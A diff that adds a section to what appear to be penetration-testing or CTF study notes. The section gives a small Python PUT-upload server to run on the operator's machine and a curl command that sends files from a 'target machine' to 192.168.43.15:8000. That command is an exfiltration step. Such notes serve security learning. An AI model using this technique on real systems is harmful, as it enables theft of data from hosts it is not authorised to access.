@@ -354,6 +354,41 @@ ip route add [the_switch_with/24] via the router [10.175.34.0/24 == 10.175.34.1]
 ```
 
 
+python server to upload stuff:
+```python
+#!/usr/bin/python
+
+import SimpleHTTPServer
+import BaseHTTPServer
+
+class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+    def do_PUT(self):
+        print self.headers
+        length = int(self.headers["Content-Length"])
+        path = self.translate_path(self.path)
+        with open(path, "wb") as dst:
+            dst.write(self.rfile.read(length))
+
+if __name__ == '__main__':
+    SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
+    
+    
+```
+your machine:
+```
+nano server.py
+python server.py 8000 or any port
+
+```
+target machine: 
+```
+curl 192.168.43.15:8000 --upload-file [file_name]
+```
+
+
+
+
+
 resources:
 [^1]:https://github.com/digital-overdose/ctf-writeups/edit/main/2022-KNIGHT_CTF/ALPHABET_KNOCK_CODE.md
 
